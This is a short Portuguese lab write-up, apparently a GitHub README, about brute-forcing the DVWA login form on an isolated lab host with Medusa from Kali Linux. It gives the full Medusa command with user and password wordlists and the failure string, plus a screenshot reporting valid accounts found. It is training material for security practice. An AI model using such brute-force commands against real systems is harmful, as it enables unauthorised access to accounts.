# Laboratório: Ataque de Força Bruta HTTP no DVWA

## 🎯 Objetivo
Realizar testes de autenticação por força bruta em uma aplicação web vulnerável (DVWA - Damn Vulnerable Web Application) utilizando o Medusa em ambiente de laboratório isolado.

## 🛠️ Ferramentas Utilizadas
* **Kali Linux** (Máquina Atacante)
* **DVWA / Metasploitable** (Alvo Web em `192.168.56.104`)
* **Wordlists:** `usuarios.txt` e `senhas.txt`
* **Medusa** (Módulo HTTP)

💻 Comando Executado
No terminal do Kali Linux, executei o seguinte comando para realizar a varredura e o teste de credenciais no formulário web:

medusa -h 192.168.56.104 -U usuarios.txt -P senhas.txt -M http \
-m PAGE '/dvwa/login.php' \
-m 'FAIL=login failed' -t 6

📸 Evidência do Laboratório
O terminal registrou com sucesso a verificação e o encontro de múltiplas combinações válidas de usuários e senhas (ACCOUNT FOUND):

<img width="1326" height="804" alt="cyber-teste" src="https://github.com/user-attachments/assets/67a8377f-e4dd-47bb-af5b-ac32a37673da" />

